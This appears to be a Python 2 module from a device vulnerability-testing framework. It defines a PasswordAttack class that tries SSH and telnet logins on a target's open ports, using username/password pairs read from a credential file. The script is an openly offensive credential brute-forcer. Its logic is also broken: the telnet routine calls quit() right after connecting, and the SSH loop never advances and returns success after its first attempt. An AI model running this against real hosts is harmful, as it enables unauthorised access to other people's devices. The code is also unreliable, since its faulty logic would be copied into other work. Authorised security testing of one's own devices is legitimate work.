from generic_attack import *
import logging
log = logging.getLogger(__name__)
import paramiko
import csv
import telnetlib

class PasswordAttack(GenericAttack):

    def __init__(self, attackName, attackConfig, deviceConfig):
        super(PasswordAttack, self).__init__(attackName, attackConfig, deviceConfig)

    def initialize(self, result):
        self.running = True
        target = self.device['ip']

        if self.device["vulnerable_ports"] is None:
            result.update({"status": "no open ports"})
            return

        if "tcp" not in self.device["vulnerable_ports"].keys():
            result.update({"status": "no open ports"})
            return

        if "open" not in self.device["vulnerable_ports"]["tcp"].keys():
            result.update({"status": "no open ports"})
            return

        """ Send packets
                """

        openPorts = self.device["vulnerable_ports"]["tcp"]["open"]

        #SSH Attack
        credential_file = self.config["credential_file_path"]
        sshStatus = self.ssh_attack(target, openPorts, credential_file)
        telnetStatus = self.telnet_attack(target, openPorts, credential_file)
        if sshStatus or telnetStatus:
            result.update({"status":"vulnerable"})
        result.update({"ssh_status": sshStatus})
        result.update({"telnet_status": telnetStatus})
        return

    def telnet_attack(self, victim, port_list, credential_file):
        host = victim
        login_file = csv.reader(open(credential_file, "rb"), delimiter="\t")
        login_list = list(zip(*login_file))
        usernames = login_list[0]
        passwords = login_list[1]

        for port in port_list:
            counter = 0
            while counter < len(usernames):
                user = usernames[counter]
                password = passwords[counter]
                try:
                    tn = telnetlib.Telnet(host, port)
                    quit()
                    tn.read_until("login: ")
                    tn.write(user + "\n")
                    tn.read_until("Password: ")
                    tn.write(password + "\n")
                    print tn.read_all()
                    return True
                except:
                    pass
                    print "Failed telnet on port", port, "with user:", user, "and password:", password
                counter += 1

        return False

    def ssh_attack(self, victim, port_list, credential_file):
        ssh = paramiko.SSHClient()
        login_file = csv.reader(open(credential_file, "rb"), delimiter="\t")
        login_list = list(zip(*login_file))
        usernames = login_list[0]
        passwords = login_list[1]

        for p in port_list:
            counter = 0
            while counter < len(usernames):
                ssh.connect(victim, port=p, username=usernames[counter], password=passwords[counter])
                return True

        return False

    def shutdown(self):
        self.running = False

    def prerequisite(self):
        return ["PortVulnerabilityTest"]
